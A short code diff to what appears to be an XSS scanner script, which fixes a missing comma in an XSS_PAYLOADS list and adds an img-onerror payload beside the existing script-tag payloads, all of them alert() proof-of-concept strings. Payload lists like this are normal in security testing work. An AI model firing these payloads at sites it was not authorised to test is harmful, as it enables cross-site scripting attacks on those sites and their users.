@@ -7,6 +7,8 @@ XSS_PAYLOADS = [
     '"><script>alert(1)</script>',
     "'><script>alert('XSS')</script>",
     '"><img src=x onerror=alert(1)>'
+    '"><img src=x onerror=alert(1)>',
+    "'><img src=x onerror=alert('XSS')>"
 ]
 
 def scan(target):
